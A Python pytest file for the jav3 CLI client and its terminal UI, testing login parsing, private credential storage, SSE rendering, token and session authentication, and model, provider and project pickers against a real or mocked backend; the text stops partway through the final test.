"""The jav3 CLI (clients/jav3cli/jav3): login-line parsing, credential file
permissions, the SSE renderer, and one login + chat round trip against the real
app over an in-process transport."""
import importlib.machinery
import importlib.util
import io
import json
import stat
from pathlib import Path

import httpx
import pytest

CLI = Path(__file__).resolve().parent.parent / "clients" / "jav3cli" / "jav3"


def _load():
    loader = importlib.machinery.SourceFileLoader("jav3cli", str(CLI))
    spec = importlib.util.spec_from_loader("jav3cli", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


jav3 = _load()


@pytest.fixture
def cfg(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    return tmp_path / "cfg" / "jav3"


# --- parsing -------------------------------------------------------------------

def test_parse_login_line():
    assert jav3.parse_login_line("address=jav3.local:8000 code=abc_DEF-123") == \
        ("jav3.local:8000", "abc_DEF-123")
    # order-free, tolerant of quotes and a trailing newline
    assert jav3.parse_login_line("  'code=xyz address=10.0.0.5:8000'\n") == \
        ("10.0.0.5:8000", "xyz")
    for bad in ("", "code=xyz", "address=h:1", "hello world", "address= code="):
        with pytest.raises(jav3.CliError):
            jav3.parse_login_line(bad)


def test_base_url():
    assert jav3.base_url("jav3.local:8000") == "http://jav3.local:8000"
    assert jav3.base_url("https://jav3.example/") == "https://jav3.example"
    with pytest.raises(jav3.CliError):
        jav3.base_url("ftp://x")


# --- credentials ---------------------------------------------------------------

def test_credentials_are_private(cfg):
    path = jav3.save_credentials("h:1", "jvd_secret")
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert stat.S_IMODE(cfg.stat().st_mode) == 0o700
    assert jav3.load_credentials() == {"address": "h:1", "token": "jvd_secret"}
    # an over-permissive pre-existing file is replaced, not reused
    path.chmod(0o644)
    jav3.save_credentials("h:2", "jvd_other")
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert jav3.delete_credentials() is True
    assert jav3.load_credentials() is None


def test_garbage_credentials_read_as_logged_out(cfg):
    cfg.mkdir(parents=True)
    (cfg / "credentials.json").write_text("{not json")
    assert jav3.load_credentials() is None


# --- SSE rendering -------------------------------------------------------------

def _sse(events):
    out = []
    for ev in events:
        out += [f"data: {json.dumps(ev)}", ""]
    return out


def test_renderer_streams_text_and_one_line_tools():
    lines = _sse([
        {"type": "start", "conversation_id": 7},
        {"type": "token", "text": "Look"},
        {"type": "tool", "id": "1", "name": "web_search", "args": {"q": "x"}},
        {"type": "tool_result", "id": "1", "name": "web_search", "ok": True, "result": "r"},
        {"type": "tool", "id": "2", "name": "read_file", "args": {"path": "a"}},
        {"type": "tool_result", "id": "2", "name": "read_file", "ok": False, "result": "nope"},
        {"type": "token", "text": "ing."},
        {"type": "final", "content": "Looking.", "conversation_id": 7},
        {"type": "token", "text": "NEVER"},          # after final: not read
    ])
    buf = io.StringIO()
    r = jav3.Renderer(buf)
    for ev in jav3.iter_sse(lines):
        if r.feed(ev):
            break
    assert r.conversation_id == 7
    assert buf.getvalue() == ("Look\n  · web_search({\"q\": \"x\"})\n"
                              "  · read_file({\"path\": \"a\"})\n"
                              "  ! read_file failed: nope\ning.\n")


def test_renderer_prints_revised_final_and_errors():
    buf = io.StringIO()
    r = jav3.Renderer(buf)
    r.feed({"type": "token", "text": "draft"})
    assert r.feed({"type": "final", "content": "better"})
    assert "--- revised ---\nbetter\n" in buf.getvalue()
    r2 = jav3.Renderer(io.StringIO())
    assert r2.feed({"type": "error", "message": "boom"}) and r2.error == "boom"


# --- round trip against the app --------------------------------------------------

async def test_login_and_whoami_against_app(cfg, tmp_env, monkeypatch):
    """Drive the real CLI commands through the real app. httpx.Client is sync,
    so the ASGI app is reached via a small sync->async bridge transport."""
    import asyncio
    import threading

    from backend import pastelogin
    from backend.auth import hash_password
    from backend.db import get_db, init_db
    from backend.main import app

    pastelogin.reset_for_tests()
    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("pw")))
        await db.commit()
    finally:
        await db.close()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),
                                 base_url="http://jav3.lan:8000") as op:
        await op.post("/api/auth/login", json={"username": "operator", "password": "pw"})
        line = (await op.post("/api/devices/login-code", json={})).json()["login"]

    loop = asyncio.new_event_loop()
    threading.Thread(target=loop.run_forever, daemon=True).start()
    atrans = httpx.ASGITransport(app=app)

    class Bridge(httpx.BaseTransport):
        def handle_request(self, request):
            body = request.read()

            async def go():
                req = httpx.Request(request.method, request.url,
                                    headers=request.headers, content=body)
                resp = await atrans.handle_async_request(req)
                data = await resp.aread()
                return resp.status_code, resp.headers, data
            status, headers, data = asyncio.run_coroutine_threadsafe(go(), loop).result(30)
            return httpx.Response(status, headers=headers, content=data)

    real_client = httpx.Client
    monkeypatch.setattr(jav3.httpx, "Client",
                        lambda **kw: real_client(transport=Bridge(), **kw))

    args = jav3.build_parser().parse_args(["login"])
    out = io.StringIO()
    # run the sync CLI off the test's event loop thread
    rc = await asyncio.to_thread(jav3.cmd_login, args, out, lambda: line)
    assert rc == 0 and "you are device:" in out.getvalue()
    creds = jav3.load_credentials()
    assert creds["address"] == "jav3.lan:8000" and creds["token"].startswith("jvd_")

    out = io.StringIO()
    assert await asyncio.to_thread(
        jav3.cmd_whoami, jav3.build_parser().parse_args(["whoami"]), out) == 0
    # the code was single-use: a second login with the same line fails cleanly
    with pytest.raises(jav3.CliError):
        await asyncio.to_thread(jav3.cmd_login, args, io.StringIO(), lambda: line)
    # logout revokes server-side too
    await asyncio.to_thread(jav3.cmd_logout,
                            jav3.build_parser().parse_args(["logout"]), io.StringIO())
    assert jav3.load_credentials() is None
    from backend import devicetokens
    assert await devicetokens.verify(creds["token"]) is None
    loop.call_soon_threadsafe(loop.stop)
    pastelogin.reset_for_tests()


# --- the TUI ------------------------------------------------------------------------

def test_args_route_words_to_the_tui_and_keep_subcommands():
    a = jav3.parse_args([])
    assert a.cmd is None and a.prompt == []
    a = jav3.parse_args(["--server", "h:1", "fix", "the", "tests"])
    assert a.cmd is None and a.server == "h:1" and a.prompt == ["fix", "the", "tests"]
    a = jav3.parse_args(["-r", "12", "--model", "deepseek/x"])
    assert a.resume == 12 and a.model == "deepseek/x" and a.prompt == []
    a = jav3.parse_args(["-p", "hello"])
    assert a.print_mode and a.prompt == ["hello"]
    a = jav3.parse_args(["chat", "--project", "demo", "hi"])
    assert a.cmd == "chat" and a.message == ["hi"] and a.project == "demo"
    assert jav3.parse_args(["--server", "h:1", "logout"]).cmd == "logout"
    # a word that is a subcommand's name is still the subcommand
    assert jav3.parse_args(["login"]).cmd == "login"


def test_attachments_inline_local_text_files(tmp_path):
    (tmp_path / "a.py").write_text("print('hi')\n")
    (tmp_path / "bin.dat").write_bytes(b"\xff\xfe\x00")
    msg, attached, skipped = jav3.expand_attachments(
        "look at @a.py and @bin.dat, not @missing or me@example.com", tmp_path)
    assert attached == ["a.py"] and skipped == ["bin.dat (not text)"]
    assert msg.endswith("File `a.py`:\n```\nprint('hi')\n```")
    assert jav3.expand_attachments("no mentions", tmp_path) == ("no mentions", [], [])


async def test_chat_options_reach_a_cli_token_but_not_a_desk_token(tmp_env):
    """The TUI's pickers: models, projects and agents by name, on the chat router
    a CLI token reaches. A desk token is refused like everywhere else in chat."""
    from backend import devicetokens
    from backend.auth import hash_password
    from backend.db import get_db, init_db
    from backend.main import app

    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("pw")))
        await db.execute("INSERT INTO projects (slug, name, path) VALUES (?, ?, ?)",
                         ("demo", "Demo", str(tmp_env / "projects" / "demo")))
        await db.commit()
    finally:
        await db.close()
    ag = tmp_env / "agents" / "coder"
    ag.mkdir(parents=True)
    (ag / "AGENT.md").write_text("---\nname: Coder\ndescription: writes code\n---\nbody\n")
    cli, _ = await devicetokens.mint("cli", by="operator")
    desk, _ = await devicetokens.mint("desk", by="operator", scope="desk")
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),
                                 base_url="http://jav3.lan:8000") as c:
        r = await c.get("/api/chat/options", headers={"Authorization": f"Bearer {cli}"})
        assert r.status_code == 200
        body = r.json()
        assert {"default", "models", "projects", "agents", "active_project"} <= set(body)
        assert body["projects"] == [{"slug": "demo", "name": "Demo"}]
        assert body["agents"] == [{"slug": "coder", "name": "Coder",
                                   "description": "writes code"}]
        r = await c.get("/api/chat/options", headers={"Authorization": f"Bearer {desk}"})
        assert r.status_code == 403
        assert (await c.get("/api/chat/options")).status_code == 401


# --- the full-screen TUI ---------------------------------------------------------------

def test_tool_titles_read_like_opencode():
    assert jav3.tool_title("read_file", {"path": "a.py"}) == ("→", "Read a.py")
    assert jav3.tool_title("edit_file", {"path": "a.py", "find": "x", "replace": "y"}) == \
        ("←", "Edit a.py")
    assert jav3.tool_title("run_code", {"command": "pytest -q"}) == ("$", "pytest -q")
    assert jav3.tool_title("web_search", {"query": "q"}) == ("◈", 'Search "q"')
    assert jav3.tool_title("git_status", {}) == ("⎇", "git status")
    assert jav3.tool_title("mystery", {"a": 1})[0] == "⚙"


def test_tool_bodies():
    body, more = jav3.tool_body("edit_file", {"find": "a\nb", "replace": "a\nc"},
                                True, "ok", False)
    assert "-b" in body and "+c" in body and more == 0
    body, more = jav3.tool_body("run_code", {"command": "seq 30"}, True,
                                "\n".join(map(str, range(30))), False)
    assert body.count("\n") == jav3.COLLAPSED_LINES - 1 and more == 20
    body, more = jav3.tool_body("run_code", {}, True, "\n".join(map(str, range(30))), True)
    assert more == 0
    assert jav3.tool_body("read_file", {"path": "a"}, True, "text", False) == (None, 0)
    assert "boom" in jav3.tool_body("read_file", {}, False, "error: boom", False)[0]
    assert jav3.parse_todos("0. [x] one\n1. [ ] two") == [(True, "one"), (False, "two")]


def _fake_server(turn_events, seen):
    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if request.headers.get("authorization") != "Bearer jvd_x":
            return httpx.Response(401, json={"detail": "not authenticated"})
        if path == "/api/devices/whoami":
            return httpx.Response(200, json={"username": "device:test"})
        if path == "/api/chat/options":
            return httpx.Response(200, json={
                "default": "deepseek/deepseek-flash", "active_project": None,
                "models": [{"id": "deepseek/deepseek-flash", "label": "Flash"}],
                "projects": [], "agents": []})
        if path == "/api/conversations":
            return httpx.Response(200, json={"conversations": []})
        if path.endswith("/info"):
            return httpx.Response(200, json={
                "title": "a chat", "input_tokens": 1000, "output_tokens": 50,
                "cost_usd": 0.001, "calls": 1, "context": {"used": 1000, "window": 100000},
                "files": [{"path": "a.py", "writes": 1}]})
        if path == "/api/chat":
            seen.append(json.loads(request.content))
            body = "".join(f"data: {json.dumps(ev)}\n\n" for ev in turn_events)
            return httpx.Response(200, text=body,
                                  headers={"content-type": "text/event-stream"})
        return httpx.Response(404, json={"detail": "nope"})
    return httpx.MockTransport(handler)


async def test_tui_runs_a_turn_end_to_end(cfg):
    """The real app, headless: send a message, and the transcript gets the tool
    rows and the reply; the sidebar gets the usage, files and todos."""
    pytest.importorskip("textual")
    events = [
        {"type": "start", "conversation_id": 9, "model": "deepseek/deepseek-flash"},
        {"type": "token", "text": "Looking."},
        {"type": "tool", "id": "1", "name": "edit_file",
         "args": {"path": "a.py", "find": "x = 1", "replace": "x = 2"}},
        {"type": "tool_result", "id": "1", "name": "edit_file", "ok": True, "result": "ok"},
        {"type": "tool", "id": "2", "name": "todo_update", "args": {"action": "check"}},
        {"type": "tool_result", "id": "2", "name": "todo_update", "ok": True,
         "result": "0. [x] edit a.py\n1. [ ] test"},
        {"type": "token", "text": "Done **now**."},
        {"type": "final", "content": "Done **now**.", "conversation_id": 9},
    ]
    seen: list = []
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_fake_server(events, seen),
                         agent="coder")
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.whoami == "device:test"
        app.editor.text = "change x"
        await pilot.press("enter")
        for _ in range(40):
            await pilot.pause(0.05)
            if not app.busy and app.cid == 9:
                break
        await pilot.pause(0.2)
        assert seen == [{"message": "change x", "conversation_id": None, "agent": "coder"}]
        assert app.cid == 9 and app.last_reply == "Done **now**."
        tools = [(tv.tname, tv.ok) for tv in app.query("ToolView")]
        assert tools == [("edit_file", True), ("todo_update", True)]
        assert app.todos == [(True, "edit a.py"), (False, "test")]
        assert app.info["files"] == [{"path": "a.py", "writes": 1}]
        replies = [str(r.source) for r in app.query("Reply")]
        assert replies == ["Looking.", "Done **now**."]
        # the second message goes to the same chat, identity not re-sent
        app.editor.text = "again"
        await pilot.press("enter")
        await pilot.pause(0.5)
        assert seen[-1] == {"message": "again", "conversation_id": 9}


async def test_tui_slash_popup_and_commands(cfg):
    pytest.importorskip("textual")
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_fake_server([], []))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        await pilot.press("/", "m", "o")
        await pilot.pause(0.1)
        assert app.popup_open() and app.popup_items[0] == ("cmd", "models")
        await pilot.press("tab")                 # takes an argument: completes, stays open
        await pilot.pause(0.1)
        assert app.editor.text == "/models " and app.popup_items == [
            ("arg", "deepseek/deepseek-flash")]
        await pilot.press("enter")
        await pilot.pause(0.3)
        assert app.model == "deepseek/deepseek-flash" and app.editor.text == ""
        # the sidebar starts hidden, whatever the width; the leader opens it
        assert app.query_one("#sidebar").display is False
        await pilot.press("ctrl+x", "b")
        await pilot.pause(0.1)
        assert app.sidebar_pref is True and app.query_one("#sidebar").display is True


async def test_conversation_info_totals_usage_and_files(tmp_env):
    from backend import devicetokens
    from backend.auth import hash_password
    from backend.db import get_db, init_db
    from backend.main import app

    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("pw")))
        cur = await db.execute("INSERT INTO conversations (summary, kind) VALUES (?, 'chat')",
                               ("a chat",))
        cid = cur.lastrowid
        for i, o in ((100, 10), (300, 20)):
            await db.execute(
                "INSERT INTO model_calls (conversation_id, model, input_tokens, output_tokens,"
                " cache_hit, cache_miss) VALUES (?, 'deepseek/deepseek-flash', ?, ?, 0, ?)",
                (cid, i, o, i))
        for tool, path in (("write_file", "a.py"), ("edit_file", "a.py"),
                           ("read_file", "b.py"), ("edit_file", "c.py")):
            await db.execute("INSERT INTO tool_calls (conversation_id, tool, args, result) "
                             "VALUES (?, ?, ?, 'ok')", (cid, tool, json.dumps({"path": path})))
        await db.commit()
    finally:
        await db.close()
    cli, _ = await devicetokens.mint("cli", by="operator")
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),
                                 base_url="http://jav3.lan:8000") as c:
        h = {"Authorization": f"Bearer {cli}"}
        r = (await c.get(f"/api/conversations/{cid}/info", headers=h)).json()
        assert r["title"] == "a chat" and r["calls"] == 2
        assert (r["input_tokens"], r["output_tokens"]) == (400, 30)
        assert r["context"]["used"] == 300
        assert r["files"] == [{"path": "a.py", "writes": 2}, {"path": "c.py", "writes": 1}]
        assert r["cost_usd"] >= 0
        assert (await c.get("/api/conversations/99999/info", headers=h)).status_code == 404


# --- logged-out start, password sessions, pickers, notifications -----------------------

async def _until(pilot, cond, tries=60, n=None):
    for _ in range(n or tries):
        if cond():
            return True
        await pilot.pause(0.05)
    return cond()


def _text(widget) -> str:
    return str(widget.render())


def test_exit_words_only_alone():
    for w in ("exit", "quit", "/exit", "/quit", "  EXIT ", "Quit\n"):
        assert jav3.is_exit(w)
    for w in ("exit now", "please exit", "/exit please", "exits", ""):
        assert not jav3.is_exit(w)


def test_picker_score_prefers_the_closest_match():
    s = jav3.picker_score
    assert s("flash", "x", "flash") > s("fla", "x", "flash") > s("fla", "x", "deepseek-flash")
    assert s("fla", "x", "deepseek-flash") > s("fla", "x", "aflash") > s("fsh", "x", "flash")
    assert s("fsh", "x", "flash") > 0 and s("zzz", "x", "flash") == 0
    assert s("demo", "x", "other", "the demo project") > 0          # meta only
    assert s("", "x", "anything") > 0


def test_credentials_keep_a_session_and_old_files_still_load(cfg):
    jav3.save_credentials("h:1", session="jwt.abc", username="operator")
    creds = jav3.load_credentials()
    assert creds == {"address": "h:1", "session": "jwt.abc", "username": "operator"}
    assert stat.S_IMODE(jav3.cred_path().stat().st_mode) == 0o600
    assert jav3.cred_of(creds) == "session:jwt.abc" and jav3.is_session("session:jwt.abc")
    assert jav3.auth_headers("session:jwt.abc") == {"Cookie": "jarvis_token=jwt.abc"}
    assert jav3.auth_headers("jvd_x") == {"Authorization": "Bearer jvd_x"}
    c = jav3._client("http://h:1", "session:jwt.abc")
    try:
        assert "authorization" not in c.headers and c.headers["cookie"] == "jarvis_token=jwt.abc"
    finally:
        c.close()
    # an old {"address", "token"} file still loads as a token
    jav3.save_credentials("h:1", "jvd_old")
    assert jav3.cred_of(jav3.load_credentials()) == "jvd_old"


def test_tui_starts_without_credentials(cfg, monkeypatch):
    """No login prompt before the TUI: `jav3` with no credentials builds the
    app with no token (and the --server address, if given)."""
    built = []

    class FakeApp:
        busy, cid, return_code = False, None, 0

        def run(self):
            pass

    class TTY:
        def isatty(self):
            return True

    monkeypatch.setattr(jav3, "tui_available", lambda: True)
    monkeypatch.setattr(jav3.sys, "stdin", TTY())
    monkeypatch.setattr(jav3.sys, "stdout", TTY())
    monkeypatch.setattr(jav3, "build_tui",
                        lambda base, token, **kw: built.append((base, token)) or FakeApp())
    monkeypatch.setattr(jav3, "cmd_login", lambda *a, **k: pytest.fail("prompted to log in"))
    assert jav3.cmd_tui(jav3.parse_args([])) == 0
    assert jav3.cmd_tui(jav3.parse_args(["--server", "h:9"])) == 0
    jav3.save_credentials("h:1", session="jwt", username="op")
    assert jav3.cmd_tui(jav3.parse_args([])) == 0
    assert built == [("", None), ("http://h:9", None), ("http://h:1", "session:jwt")]


async def test_tui_logged_out_state_and_hint(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("", None, transport=_fake_server([], seen))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.logged_in is False and app._access_label() == "not logged in"
        assert "not logged in" in _text(app.query_one("#status-left"))
        app.editor.text = "hello"
        await pilot.press("enter")
        await pilot.pause(0.2)
        assert seen == []
        assert any("/login" in _text(n) for n in app.query("Note"))
    # a refused token is the same state, not a crash
    app = jav3.build_tui("http://h:1", "jvd_revoked", transport=_fake_server([], seen))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.logged_in is False and not app.full_access


def _session_server(seen, notices=()):
    """A fake server that only knows the operator session cookie."""
    models = {
        "deepseek": [{"id": "deepseek-flash", "label": "Flash", "enabled": True,
                      "default": True},
                     {"id": "deepseek-pro", "label": "Pro", "enabled": False,
                      "default": False}],
        "ollama": [{"id": "llama3", "label": "llama3", "enabled": True, "default": False}],
    }
    provs = [
        {"id": "deepseek", "label": "DeepSeek", "key_set": True, "needs_key": True,
         "needs_base_url": False, "enabled": True, "base_url": "https://api.deepseek.com"},
        {"id": "openai", "label": "OpenAI", "key_set": False, "needs_key": True,
         "needs_base_url": False, "enabled": False, "base_url": "https://api.openai.com/v1"},
        {"id": "ollama", "label": "Ollama", "key_set": False, "needs_key": False,
         "needs_base_url": False, "enabled": True, "base_url": "http://localhost:11434"},
    ]

    def handler(request: httpx.Request) -> httpx.Response:
        path, method = request.url.path, request.method
        body = json.loads(request.content) if request.content else None
        if path == "/api/health":
            return httpx.Response(200, json={"ok": True})
        if path == "/api/auth/login":
            if body != {"username": "operator", "password": "pw"}:
                return httpx.Response(401, json={"detail": "bad credentials"})
            return httpx.Response(200, json={"ok": True, "username": "operator"}, headers={
                "set-cookie": "jarvis_token=sess; HttpOnly; Max-Age=604800; Path=/; "
                              "SameSite=lax; Secure"})
        if "jarvis_token=sess" not in request.headers.get("cookie", ""):
            return httpx.Response(401, json={"detail": "not authenticated"})
        seen.append((method, path, body))
        if path == "/api/devices/whoami":
            return httpx.Response(200, json={"username": "operator"})
        if path == "/api/chat/options":
            return httpx.Response(200, json={
                "default": "deepseek/deepseek-flash", "active_project": None,
                "models": [{"id": "deepseek/deepseek-flash", "label": "Flash"}],
                "projects": [{"slug": "demo", "name": "Demo"}], "agents": []})
        if path == "/api/conversations":
            return httpx.Response(200, json={"conversations": []})
        if path == "/api/agents/notices/stream":
            text = "".join(f"data: {json.dumps(ev)}\n\n"
                           for ev in [{"type": "stream_open"}, *notices])
            return httpx.Response(200, text=text, headers={"content-type": "text/event-stream"})
        if path == "/api/providers":
            return httpx.Response(200, json={"default": "deepseek/deepseek-flash",
                                             "providers": provs})
        if path.startswith("/api/providers/"):
            rest = path[len("/api/providers/"):]
            pid, _, tail = rest.partition("/")
            if method == "GET" and not tail:
                p = next(x for x in provs if x["id"] == pid)
                return httpx.Response(200, json=p | {"models": models.get(pid, [])})
            if method == "PUT" and tail.startswith("models/"):
                m = next(x for x in models[pid] if x["id"] == tail[len("models/"):])
                if body.get("default"):
                    for ms in models.values():
                        for x in ms:
                            x["default"] = False
                    m["default"] = m["enabled"] = True
                if "enabled" in body:
                    m["enabled"] = body["enabled"]
                return httpx.Response(200, json={"model": dict(m)})
            if method == "PUT":
                return httpx.Response(200, json={"id": pid})
            if tail == "test":
                return httpx.Response(200, json={"ok": True, "detail": "ok",
                                                 "models_found": ["gpt-x"]})
        if path == "/api/projects" and method == "GET":
            return httpx.Response(200, json={"projects": [{"slug": "demo", "name": "Demo"}],
                                             "active": None})
        if path == "/api/projects" and method == "POST":
            return httpx.Response(200, json={"slug": "new-thing", "name": body["name"]})
        return httpx.Response(404, json={"detail": "nope"})
    return httpx.MockTransport(handler)


async def test_tui_password_login_stores_a_session_and_sends_the_cookie(cfg, monkeypatch):
    pytest.importorskip("textual")
    seen: list = []
    transport = _session_server(seen, notices=[
        {"type": "agent_run_done", "conversation_id": 44, "agent": "Coder", "ok": True,
         "took": "2m 03s", "summary": "all tests pass"}])
    real = httpx.Client
    monkeypatch.setattr(jav3.httpx, "Client", lambda **kw: real(transport=transport, **kw))
    app = jav3.build_tui("", None, transport=transport)
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.logged_in is False
        app.dispatch("/login")
        await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        assert app.screen.query_one("#choices").highlighted == 0      # password first
        await pilot.press("enter")
        await _until(pilot, lambda: type(app.screen).__name__ == "Ask")
        await pilot.press(*"h:1", "enter")                         # address
        await pilot.pause(0.1)
        await pilot.press(*"operator", "enter")                    # username
        await pilot.pause(0.1)
        assert app.screen.query_one("#answer").password is True     # hidden
        await pilot.press("p", "w", "enter")
        assert await _until(pilot, lambda: app.logged_in is True)
        assert app.token == "session:sess" and app.full_access
        assert app._access_label() == "full access"
        assert jav3.load_credentials() == {"address": "h:1", "session": "sess",
                                           "username": "operator"}
        # the session reaches the operator-only notice stream: agent runs show up
        assert await _until(pilot, lambda: any("Coder" in t for _, _, t in app.notices))
        assert ("GET", "/api/agents/notices/stream", None) in seen
        assert "full access" in _text(app.query_one("#sb-foot"))


async def test_password_login_against_the_app(cfg, tmp_env, monkeypatch):
    """The real /api/auth/login: the cookie is the web app's, so a password
    session reaches control-plane routes a device token cannot."""
    import asyncio
    import threading

    from backend.auth import hash_password
    from backend.db import get_db, init_db
    from backend.main import app

    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("pw")))
        await db.commit()
    finally:
        await db.close()
    loop = asyncio.new_event_loop()
    threading.Thread(target=loop.run_forever, daemon=True).start()
    atrans = httpx.ASGITransport(app=app)

    class Bridge(httpx.BaseTransport):
        def handle_request(self, request):
            body = request.read()

            async def go():
                req = httpx.Request(request.method, request.url,
                                    headers=request.headers, content=body)
                resp = await atrans.handle_async_request(req)
                return resp.status_code, resp.headers, await resp.aread()
            status, headers, data = asyncio.run_coroutine_threadsafe(go(), loop).result(30)
            return httpx.Response(status, headers=headers, content=data)

    real = httpx.Client
    monkeypatch.setattr(jav3.httpx, "Client", lambda **kw: real(transport=Bridge(), **kw))
    with pytest.raises(jav3.CliError, match="wrong username or password"):
        await asyncio.to_thread(jav3.login_with_password, "jav3.lan:8000", "operator", "no")
    base, cred, who = await asyncio.to_thread(
        jav3.login_with_password, "jav3.lan:8000", "operator", "pw")
    assert base == "http://jav3.lan:8000" and who == "operator" and jav3.is_session(cred)
    assert jav3.load_credentials()["session"] == cred[len("session:"):]

    def full_access():
        with jav3._client(base, cred) as c:
            return c.get("/api/providers", params={"models": 0}).status_code
    assert await asyncio.to_thread(full_access) == 200
    out = io.StringIO()
    assert await asyncio.to_thread(jav3.cmd_whoami, jav3.parse_args(["whoami"]), out) == 0
    assert out.getvalue().startswith("operator @")
    out = io.StringIO()
    assert await asyncio.to_thread(jav3.cmd_logout, jav3.parse_args(["logout"]), out) == 0
    assert "logged out" in out.getvalue() and jav3.load_credentials() is None
    loop.call_soon_threadsafe(loop.stop)


async def test_picker_opens_on_the_list_and_typing_highlights_the_closest(cfg):
    pytest.importorskip("textual")
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_fake_server([], []))
    rows = [("a", "deepseek-pro-flash", ""), ("b", "aflash", ""), ("c", "flash", ""),
            ("d", "other", "")]
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        out: list = []

        async def go():
            out.append(await app.pick("T", rows, "d"))
        app.run_worker(go())
        await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        scr = app.screen
        ol = scr.query_one("#choices")

        def cur():
            return ol.get_option_at_index(ol.highlighted).id
        assert not scr.typing and cur() == "d"                 # list mode, on the current
        await pilot.press("up")
        assert cur() == "c"
        await pilot.press("f", "l", "a")                        # any letter starts typing
        await pilot.pause(0.1)
        assert scr.typing and scr.query_one("#filter").value == "fla"
        assert [ol.get_option_at_index(i).id for i in range(ol.option_count)] == \
            ["c", "a", "b"]
        assert cur() == "c"                                    # the closest match
        await pilot.press("down")                              # still navigable
        assert cur() == "a"
        await pilot.press("enter")
        await _until(pilot, lambda: out)
        assert out == ["a"]

        out.clear()
        app.run_worker(go())
        await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        scr = app.screen
        await pilot.press("t")                                 # t: type mode, no letter
        await pilot.pause(0.1)
        assert scr.typing and scr.query_one("#filter").value == ""
        await pilot.press("o", "t")
        await pilot.pause(0.1)
        ol = scr.query_one("#choices")
        assert ol.get_option_at_index(ol.highlighted).id == "d"
        await pilot.press("backspace", "backspace", "backspace")  # the 3rd leaves typing
        await pilot.pause(0.1)
        assert not scr.typing and ol.option_count == 4
        await pilot.press("escape")
        await _until(pilot, lambda: out)
        assert out == [None]


async def test_model_picker_lists_keyed_providers_and_toggles(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "session:sess", transport=_session_server(seen))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.full_access
        app.dispatch("/model")
        await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        scr = app.screen
        # grouped by provider (heading rows); openai has no key so is not listed
        assert [r[0] for r in scr.rows] == ["default", None, "deepseek/deepseek-flash",
                                            "deepseek/deepseek-pro", None, "ollama/llama3"]
        assert scr.rows[3][2] == "off" and scr.rows[2][2] == "default"
        ol = scr.query_one("#choices")
        assert ol.get_option_at_index(ol.highlighted).id == "deepseek/deepseek-flash"
        await pilot.press("down")
        await pilot.press("space")                             # switch it on
        assert await _until(pilot, lambda: ("PUT", "/api/providers/deepseek/models/"
                                            "deepseek-pro", {"enabled": True}) in seen)
        await _until(pilot, lambda: app.screen.rows[3][2] == "")
        await pilot.press("d")                                 # make it the default
        assert await _until(pilot, lambda: ("PUT", "/api/providers/deepseek/models/"
                                            "deepseek-pro", {"default": True}) in seen)
        await _until(pilot, lambda: app.screen.rows[3][2] == "default")
        assert app.screen.rows[2][2] == ""
        assert ol.get_option_at_index(ol.highlighted).id == "deepseek/deepseek-pro"
        await pilot.press("enter")
        assert await _until(pilot, lambda: app.model == "deepseek/deepseek-pro")


async def test_provider_flow_sets_the_key_and_tests(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "session:sess", transport=_session_server(seen))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.dispatch("/provider")
        await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        await pilot.press(*"openai")
        await pilot.pause(0.1)
        await pilot.press("enter")
        await _until(pilot, lambda: type(app.screen).__name__ == "Ask")
        assert app.screen.query_one("#answer").password is True
        await pilot.press(*"sk-1", "enter")
        await pilot.pause(0.2)
        assert type(app.screen).__name__ == "Ask"               # base URL: enter keeps it
        await pilot.press("enter")
        assert await _until(pilot, lambda: ("POST", "/api/providers/openai/test", {}) in seen)
        assert ("PUT", "/api/providers/openai", {"enabled": True, "api_key": "sk-1"}) in seen
        assert await _until(pilot, lambda: any("connected" in _text(n)
                                               for n in app.query("Note")))
    # with only a device token it explains how to get full access
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_fake_server([], []))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.dispatch("/provider")
        await pilot.pause(0.3)
        assert any("full access" in _text(n) for n in app.query("Note"))


async def test_project_picker_makes_a_new_project(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "session:sess", transport=_session_server(seen))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.dispatch("/project")
        await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
